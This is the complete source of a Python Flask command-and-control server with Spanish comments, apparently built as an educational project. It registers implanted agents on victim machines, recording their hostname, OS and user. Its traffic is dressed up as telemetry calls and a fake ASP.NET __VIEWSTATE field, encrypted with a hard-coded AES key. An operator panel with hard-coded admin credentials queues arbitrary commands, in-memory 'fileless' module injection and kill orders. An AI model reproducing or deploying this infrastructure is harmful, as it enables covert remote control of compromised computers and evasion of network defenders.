import logging
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

from flask import Flask, request, render_template, jsonify, redirect, url_for, session as flask_session
import json, base64, urllib.parse, os, time, uuid, hashlib

try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
    AES_AVAILABLE = True
except ImportError:
    AES_AVAILABLE = False

app = Flask(__name__)
app.secret_key = os.urandom(24)

# =========================================================
# ESTADO DEL SERVIDOR Y BD
# =========================================================
AES_KEY = b'C2ProjectEduKey2024!SecureKey32b'
DB_FILE = 'c2_database.json'

agentes_activos = {}
tareas_pendientes = {}   # { agent_id: [{'command': '...', 'task_id': '...'}, ...] }
resultados_tareas = {}   # { task_id: {'output': '...', 'error': '...'} }

def load_state():
    global agentes_activos
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, 'r') as f:
                agentes_activos = json.load(f)
            print(f"[+] Cargados {len(agentes_activos)} Beacons desde la Base de Datos.")
        except Exception as e:
            print(f"[-] Error leyendo la DB: {e}")

def save_state():
    try:
        with open(DB_FILE, 'w') as f:
            json.dump(agentes_activos, f, indent=4)
    except Exception as e:
        print(f"[-] Error guardando DB: {e}")

load_state()

# =========================================================
# CRIPTOGRAFÍA AES
# =========================================================
class AESCipher:
    def __init__(self, key: bytes = AES_KEY):
        if AES_AVAILABLE:
            self.key = hashlib.sha256(key).digest() if len(key) != 32 else key
            
    def decrypt(self, encrypted_data: bytes) -> bytes:
        if not AES_AVAILABLE: return bytes([b ^ 0x42 for b in encrypted_data])
        raw = base64.b64decode(encrypted_data)
        cipher = AES.new(self.key, AES.MODE_CBC, raw[:16])
        return unpad(cipher.decrypt(raw[16:]), AES.block_size)

    def encrypt(self, plaintext: bytes) -> bytes:
        if not AES_AVAILABLE: return bytes([b ^ 0x42 for b in plaintext])
        iv = os.urandom(16)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
        return base64.b64encode(iv + ciphertext)

aes = AESCipher()

def decode_payload(b64_encoded: str):
    try:
        decrypted = aes.decrypt(b64_encoded.encode('utf-8'))
        return json.loads(decrypted.decode('utf-8'))
    except Exception as e:
        return None

def encode_payload(data: dict):
    json_data = json.dumps(data).encode('utf-8')
    return aes.encrypt(json_data).decode('utf-8')

# =========================================================
# RUTAS DE AGENTES (BEACONS)
# =========================================================
@app.route('/api/v2/telemetry', methods=['GET'])
def agent_checkin():
    cookie = request.cookies.get('session_id')
    if not cookie: return "", 200
    
    agent_id = urllib.parse.unquote(cookie)
    
    # Registro de actividad
    if agent_id in agentes_activos:
        agentes_activos[agent_id]['last_seen'] = time.strftime("%H:%M:%S")
        save_state()
    
    # Hay tareas para este agente?
    if agent_id in tareas_pendientes and tareas_pendientes[agent_id]:
        task = tareas_pendientes[agent_id].pop(0)
        # Retornamos cifrado
        return encode_payload(task), 200
        
    return "", 200

@app.route('/api/v2/update', methods=['POST'])
def agent_response():
    cookie = request.cookies.get('session_id')
    viewstate = request.form.get('__VIEWSTATE')
    
    if cookie and viewstate:
        payload = decode_payload(viewstate)
        if payload:
            task_id = payload.get('task_id')
            cmd = payload.get('command')
            
            # Si es register
            if cmd == 'register' or 'info' in payload:
                agent_id = payload.get('id')
                if agent_id:
                    info = payload.get('info', {})
                    agentes_activos[agent_id] = {
                        'ip': request.remote_addr,
                        'hostname': info.get('hostname', 'Unknown'),
                        'os': info.get('os', 'Unknown'),
                        'user': info.get('username', 'Unknown'),
                        'last_seen': time.strftime("%H:%M:%S")
                    }
                    save_state()
                    if agent_id not in tareas_pendientes:
                        tareas_pendientes[agent_id] = []
            else:
                # Es el resultado de un comando
                if task_id:
                    resultados_tareas[task_id] = payload
                    
    return "", 200

# =========================================================
# PANEL WEB & ADMIN ROUTES
# =========================================================
def is_logged_in():
    return flask_session.get('logged_in') is True

@app.route('/')
def index():
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        user = request.form.get('username')
        pwd = request.form.get('password')
        if user == 'admin' and pwd == 'c2admin2026':  # Credenciales profesionales
            flask_session['logged_in'] = True
            return redirect(url_for('dashboard'))
        else:
            return render_template('login.html', error="Invalid Operator Credentials")
    return render_template('login.html', error=None)

@app.route('/logout')
def logout():
    flask_session.clear()
    return redirect(url_for('login'))

@app.route('/admin/dashboard')
def dashboard():
    if not is_logged_in(): return redirect(url_for('login'))
    return render_template('dashboard.html')

# --- API AJAX para FronEnd ---
@app.route('/api/admin/beacons')
def api_get_beacons():
    if not is_logged_in(): return jsonify({'error':'Unauthorized'}), 401
    return jsonify(agentes_activos)

@app.route('/api/admin/tasks', methods=['POST'])
def api_add_task():
    if not is_logged_in(): return jsonify({'error':'Unauthorized'}), 401
    data = request.json
    agent_id = data.get('agent_id')
    cmd = data.get('command')
    args = data.get('args', '')
    
    if agent_id in agentes_activos:
        task_id = str(uuid.uuid4())[:8]
        
        # Inyección fileless específica si se pide
        if cmd == 'inject':
            mod_path = f"modules/{args}.py"
            if os.path.exists(mod_path):
                with open(mod_path, 'r', encoding='utf-8') as f:
                    script = f.read()
                task_payload = {'command': 'evaluate_in_memory', 'task_id': task_id, 'fileless_script': script, 'args': args}
                tareas_pendientes.setdefault(agent_id, []).append(task_payload)
                return jsonify({'status':'ok', 'task_id': task_id, 'msg': 'Módulo inyectado enviado.'})
            else:
                return jsonify({'error':'Módulo no encontrado'})
                
        elif cmd == 'kill':
            task_payload = {'command': 'kill', 'task_id': task_id}
            tareas_pendientes.setdefault(agent_id, []).append(task_payload)
            del agentes_activos[agent_id]
            save_state()
            return jsonify({'status':'ok', 'task_id': task_id, 'msg': 'Kill Dispatched'})
            
        else:
            task_payload = {'command': cmd, 'task_id': task_id, 'args': args}
            tareas_pendientes.setdefault(agent_id, []).append(task_payload)
            return jsonify({'status':'ok', 'task_id': task_id})
            
    return jsonify({'error': 'Agent not found'}), 404

@app.route('/api/admin/results')
def api_get_results():
    if not is_logged_in(): return jsonify({'error':'Unauthorized'}), 401
    # Devolvemos una copia de lo procesado y limpiamos la cola (Short Polling)
    res = dict(resultados_tareas)
    resultados_tareas.clear()
    return jsonify(res)

if __name__ == '__main__':
    print("==================================================")
    print("   C2 TEAM SERVER (MULTIPLAYER WEB DASHBOARD)     ")
    print("==================================================")
    print("[*] Dashboard URL: http://0.0.0.0:5000")
    print("[*] Credenciales: admin / c2admin2026")
    # Bind universal
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
